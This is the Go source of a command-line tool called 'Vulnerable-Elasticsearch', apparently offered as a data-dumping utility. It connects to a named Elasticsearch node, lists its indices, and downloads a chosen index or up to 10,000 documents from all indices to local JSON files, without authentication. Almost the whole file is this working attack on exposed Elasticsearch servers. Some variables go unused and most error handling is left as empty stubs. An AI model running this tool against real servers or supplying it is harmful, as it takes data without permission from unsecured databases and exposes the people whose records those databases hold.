package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"github.com/spf13/pflag"
	"github.com/spf13/viper"
	"net"
	"net/http"
	"io/ioutil"
	"github.com/cheggaaa/pb"


)

const applicationName string = "Vulnerable-Elasticsearch"
const applicationVersion string = "v1.0"

type output struct {
	out []byte
	err error
}

var (
	myDevice        string
	platform        string
	project_id      string
	api_secret_key  string
	doEncode        bool
	doEncodeForTest bool
	slice1M         bool
	simple          bool
	ipfs            bool
)

func init() {
	flag.String("node", "", "Get Node Server")
	flag.String("indice", "", "Dump Indice Node")
	flag.String("port", "", "Elastic Port Address")
	flag.Bool("full", false, "Full Dump")
	flag.Bool("help", false, "Display help")
	flag.Bool("version", false, "Display version information")
	pflag.CommandLine.AddGoFlagSet(flag.CommandLine)
	pflag.Parse()
	err := viper.BindPFlags(pflag.CommandLine)
	checkErr(err)

	if viper.GetBool("help") {
		displayHelp()
		os.Exit(0)
	}

	if viper.GetBool("version") {
		fmt.Println(applicationName + " " + applicationVersion)
		os.Exit(0)
	}

if viper.GetString("node") != "" {
		command := viper.GetString("node")
		fmt.Println(command)
	}

	if viper.GetString("port") != "" {
		port := viper.GetString("port")
		fmt.Println(port)
	}

	if viper.GetString("indice") != "" {
		command := viper.GetString("indice")
		fmt.Println(command)

	}


}

func main() {
	
        banner() // Display banner
	
	port := "9200"
		
if viper.GetString("node") != "" {
		command := viper.GetString("node")
		
if viper.GetString("port") != "" {
		port = viper.GetString("port")
	}

fmt.Println("[*] Checking if port "+port+" is open on", command)

	conn, err := net.Dial("tcp", command+":"+port+"")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer conn.Close()

	fmt.Println("[*] Port 9200 is open on", command)

	url := "http://" + command + ":"+port+"/_cat/indices?v"
	fmt.Println("[*] Fetching output from", url)

	response, err := http.Get(url)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Println(string(body))


	if viper.GetString("indice") != "" {
		indicei := viper.GetString("indice")
		fmt.Println("[*] Downloading "+indicei)





		// Set up the HTTP request
		req, err := http.NewRequest("GET", "http://"+command+":"+port+"/"+indicei+"/_search", nil)
		if err != nil {
			// Handle error
		}

		// Set the HTTP basic authentication header (if necessary)
		//req.SetBasicAuth("username", "password")

		// Send the request and get the response


		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			// Handle error
		}
		defer resp.Body.Close()


			//progress bar

			// Set up the progress bar
			bar := pb.New(int(resp.ContentLength)).SetUnits(pb.U_BYTES)
			bar.Start()



		// Read the response body
		body, err := ioutil.ReadAll(bar.NewProxyReader(resp.Body))
		if err != nil {
			// Handle error
		}

		// Write the response body to a file
		file, err := os.Create("dump.json")
		if err != nil {
			// Handle error
		}
		defer file.Close()

		_, err = file.Write(body)
		if err != nil {
			// Handle error
		}


		bar.Finish()





	}else if viper.GetBool("full") {
			fmt.Println("[*] Full dump")




			// Set up the HTTP request to get all indices
			req, err := http.NewRequest("GET", "http://"+command+":"+port+"/_all/_search?size=10000", nil)
			if err != nil {
				// Handle error
			}

			// Set the HTTP basic authentication header (if necessary)
			//req.SetBasicAuth("username", "password")

			// Set up the HTTP client and send the request
			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				// Handle error
			}
			defer resp.Body.Close()


			//progress bar

			// Set up the progress bar
			bar := pb.New(int(resp.ContentLength)).SetUnits(pb.U_BYTES)
			bar.Start()




			// Read the response body
			body, err := ioutil.ReadAll(bar.NewProxyReader(resp.Body))
			if err != nil {
				// Handle error
			}






			// Write the response body to a file
			file, err := os.Create("fulldump.json")
			if err != nil {
				// Handle error
			}
			defer file.Close()

			_, err = file.Write(body)
			if err != nil {
				// Handle error
			}


			bar.Finish()







		





	}






	}else{

		displayHelp()
	}
	


}

// checks errors
func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}






// displays help information
func displayHelp() {
	message := `

          --node [Vulnerable node]     Vulnerable node server
	  --full                       Full Dump
	  --indice                     Dump Indice Node
	  --port                       Elastic Port Address
	  --help                       Display help
	  --version                    Display version
	  `
	fmt.Println(applicationName + " " + applicationVersion)
	fmt.Println(message)
}

func banner() {
	banner := `
	____ _    ____ ____ ___ _ ____    ___  _  _ _  _ ___  
	|___ |    |__| [__   |  | |       |  \ |  | |\/| |__] 
	|___ |___ |  | ___]  |  | |___    |__/ |__| |  | |  

`
	fmt.Println(banner)
}

